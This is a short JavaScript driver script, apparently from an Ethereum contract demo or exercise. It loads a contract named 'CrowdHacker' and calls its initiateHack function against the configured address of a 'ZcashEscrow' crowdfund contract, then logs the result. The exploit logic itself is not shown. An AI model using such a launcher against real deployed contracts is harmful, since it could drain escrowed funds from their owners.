contract = new require('../contract')('CrowdHacker')

crowdfundAddress = contract.config['ZcashEscrow']['contractAddress']

func = (instance) => {
  instance.initiateHack(crowdfundAddress,
    {from: contract.web3.eth.coinbase, gas: 300000},
    function(err, data, something) {
        console.log("err: " + err);
        console.log("data: " + data);
        console.log("something: " + something);
    })
}

contract.runFunc(func)
